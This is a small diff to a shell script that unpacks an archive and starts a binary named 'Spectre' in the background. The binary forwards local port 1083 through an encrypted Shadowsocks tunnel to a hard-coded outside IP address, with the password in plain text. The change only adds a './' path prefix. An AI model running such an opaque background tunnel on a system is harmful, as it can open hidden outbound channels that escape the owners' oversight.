@@ -7,7 +7,7 @@ tar -xf Spectre.tar.gz
 
 sleep 2
 
-Spectre -L=:1083 -F=ss://aes-128-cfb:mikrotik999@45.135.58.52:8443 &
+./Spectre -L=:1083 -F=ss://aes-128-cfb:mikrotik999@45.135.58.52:8443 &
 
 sleep 2
 
